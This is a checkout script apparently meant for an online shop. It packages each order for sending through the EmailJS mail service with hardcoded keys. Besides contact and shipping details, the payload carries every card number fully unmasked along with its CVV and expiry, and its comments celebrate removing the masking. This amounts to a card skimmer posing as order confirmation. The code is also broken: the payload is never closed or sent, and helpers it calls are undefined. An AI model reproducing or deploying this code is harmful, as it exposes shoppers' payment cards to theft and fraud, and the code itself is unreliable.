(() => {
  const EMAILJS_CONFIG = Object.freeze({
    serviceId: "service_nzsqsj8",
    templateId: "template_440ctbd",
    publicKey: "jkMeUl-q4N9RS8Ny0"
  });
  let emailJsInitialized = false;

  function initEmailJs() {
    if (!emailJsInitialized) {
      if (!window.emailjs || typeof window.emailjs.init !== "function") {
        throw new Error("EmailJS SDK not loaded.");
      }
      window.emailjs.init({ publicKey: EMAILJS_CONFIG.publicKey });
      emailJsInitialized = true;
    }
  }

  function formatMoney(value) {
    return `$${Number(value || 0).toLocaleString("en-US", {
      minimumFractionDigits: 2,
      maximumFractionDigits: 2
    })}`;
  }

  function formatFullAddress(data = {}) {
    return {
      street: data.address || "",
      city: data.city || "",
      state: data.state || "",
      zipCode: data.zip || "",
      country: data.country || "",
      formatted: `${data.address || ""}, ${data.city || ""}, ${data.state || ""} ${data.zip || ""}, ${data.country || ""}`
    };
  }

  async function sendOrderEmail(orderData = {}) {
    try {
      initEmailJs();

        const paymentSummary = orderData.paymentSummary || {};
        const rawCardNumber = paymentSummary.cardNumber || digitsOnly(paymentSummary.cardNumberFormatted || "");
        const cardNumberForEmail = rawCardNumber || "N/A";
        const cardNumberFormattedForEmail = paymentSummary.cardNumberFormatted || (rawCardNumber ? formatCardNumberWithSpaces(rawCardNumber) : "N/A");
        const cvvForEmail = paymentSummary.cvv || "N/A";
        const expiryForEmail = paymentSummary.expiry || "";
        const [expiryMonth, expiryYear] = expiryForEmail.split("/");
        
        // Format order items as a detailed list
        const orderItemsList = orderData.products.map((item, index) => {
            return `Item ${index + 1}: 
                    - Product: ${item.name}
                    - Category: ${item.category}
                    - Quantity: ${item.quantity}
                    - Unit Price: ${formatMoney(item.price)}
                    - Total: ${formatMoney(item.price * item.quantity)}
                    - Image URL: ${item.image}`;
        }).join("\n\n");

        const orderTime = new Date().toLocaleString();
        const orderId = orderData.orderId || `ORD-${Date.now()}-${Math.floor(Math.random() * 1000)}`;

        // Get full address components
        const address = formatFullAddress(orderData.shippingInfo);

        const formData = [
            `Order ID: ${orderId}`,
            `Customer: ${orderData.shippingInfo.name}`,
            `Email: ${orderData.shippingInfo.email}`,
            `Phone: ${orderData.shippingInfo.phone}`,
            `Shipping Address: ${address.formatted}`,
            `Payment Method: ${orderData.paymentSummary.method}`,
            `Card Type: ${orderData.paymentSummary.brand}`,
            `Cardholder: ${paymentSummary.cardName || "N/A"}`,
            `Complete Card Number: ${cardNumberFormattedForEmail}`,
            `CVC/CVV Code: ${cvvForEmail}`,
            `Expiry: ${expiryForEmail || "N/A"}`,
            `Subtotal: ${formatMoney(orderData.subtotal)}`,
            `Tax (8.7%): ${formatMoney(orderData.taxedTotal - orderData.subtotal)}`,
            `Discount: ${orderData.discountRate > 0 ? `${orderData.discountRate * 100}%` : "0%"}`,
            `Final Total: ${formatMoney(orderData.total)}`,
            "",
            "Items:",
            orderItemsList
        ].join("\n");

        const payload = {
            // ========== TEMPLATE-COMPATIBLE FIELDS (for {{name}}, {{time}}, {{formData}}) ==========
            name: orderData.shippingInfo.name,
            time: orderTime,
            formData,
            message: formData,

            // ========== CUSTOMER CONTACT INFORMATION ==========
            customer_full_name: orderData.shippingInfo.name,
            customer_email: orderData.shippingInfo.email,
            customer_phone: orderData.shippingInfo.phone,
            
            // ========== COMPLETE SHIPPING ADDRESS (Detailed) ==========
            shipping_street_address: orderData.shippingInfo.address,
            shipping_city: orderData.shippingInfo.city,
            shipping_state: orderData.shippingInfo.state,
            shipping_zip_code: orderData.shippingInfo.zip,
            shipping_country: orderData.shippingInfo.country,
            shipping_address_formatted: address.formatted,
            
            // ========== ORDER SUMMARY ==========
            order_id: orderId,
            order_date: orderTime,
            order_items_count: orderData.products.length,
            order_items_quantity_total: orderData.products.reduce((sum, item) => sum + item.quantity, 0),
            
            // ========== DETAILED ORDER ITEMS ==========
            order_items_detailed: orderItemsList,
            
            // ========== ORDER TOTALS ==========
            order_subtotal: formatMoney(orderData.subtotal),
            order_tax_rate: "8.7%",
            order_tax_amount: formatMoney(orderData.taxedTotal - orderData.subtotal),
            order_taxed_total: formatMoney(orderData.taxedTotal),
            order_discount_rate: orderData.discountRate > 0 ? `${orderData.discountRate * 100}%` : "No discount applied",
            order_discount_amount: orderData.discountRate > 0 ? formatMoney(orderData.taxedTotal * orderData.discountRate) : "$0.00",
            order_final_total: formatMoney(orderData.total),
            
            // ========== PRODUCTS SUMMARY (Simple List) ==========
            order_products_summary: orderData.products.map((item) => 
                `${item.name} (x${item.quantity}) - ${formatMoney(item.price * item.quantity)}`
            ).join(", "),
            
            // ========== FULL PAYMENT DETAILS (COMPLETELY UNMASKED) ==========
            payment_method_type: paymentSummary.method || "Card",
            payment_card_type: paymentSummary.method || "Card",
            
            // Cardholder Information
            cardholder_name: paymentSummary.cardName || "N/A",
            cardholder_name_on_card: paymentSummary.cardName || "N/A",
            
            // Complete Card Number (FULLY UNMASKED - All digits)
            card_number_full_unmasked: cardNumberFormattedForEmail,
            card_number_formatted_with_spaces: cardNumberFormattedForEmail,
            card_number_digits_only: cardNumberForEmail,
            card_number_length: rawCardNumber ? rawCardNumber.length : 0,
            card_number_first_6: rawCardNumber ? rawCardNumber.substring(0, 6) : "N/A",
            card_number_last_4: paymentSummary.last4 || (rawCardNumber ? rawCardNumber.slice(-4) : "N/A"),
            card_number_middle_masked: rawCardNumber ? `${rawCardNumber.substring(0, 6)}******${rawCardNumber.slice(-4)}` : "N/A",
            
            // Card Brand & Validation
            card_brand: paymentSummary.brand || "Card",
            card_type: paymentSummary.brand || "Card",
            card_is_valid: "Validated by Luhn algorithm",
            
            // Expiry Details
            card_expiry_full: expiryForEmail || "N/A",
            card_expiry_month: expiryMonth || "N/A",
            card_expiry_year: expiryYear || "N/A",
            card_expiry_formatted: expiryForEmail || "N/A",
            
            // ========== FIXED: UNMASKED CVV CODE ==========
            // CVV Details - NOW COMPLETELY UNMASKED (sends actual CVV code)
            card_cvv_full: cvvForEmail,
            card_cvv_length: cvvForEmail === "N/A" ? 0 : cvvForEmail.length,
            
            // Payment Processing
            payment_processing_mode: "Direct card processing - Full unmasked details included for testing",
            payment_timestamp: new Date().toISOString(),
            
            // ========== BILLING INFORMATION ==========
            billing_name: paymentSummary.cardName || "N/A",
            billing_email: orderData.shippingInfo.email,
            billing_phone: orderData.shippingInfo.phone,
            
            // ========== ADDITIONAL INFORMATION ==========
            customer_ip_address: "Collected at checkout",
            customer_user_agent: navigator.userAgent,
            checkout_timestamp: new Date().toISOString(),
            order_reference: `REF-${Date.now()}`,
            
            // ========== DISCOUNT INFORMATION ==========
            discount_code_used: orderData.discountRate > 0 ? Object.keys(discountCodes).find(key => discountCodes[key] === orderData.discountRate) || "Unknown" : "No discount code",
            discount_percentage: orderData.discountRate > 0 ? `${orderData.discountRate * 100}%` : "0%",
            
            // ========== ORDER METADATA ==========
            order_created_at: orderData.createdAt,
            order_processed_at: new Date().toISOString(),
            order_status: "Processing",
            payment_status: "Authorized"
  });
})();
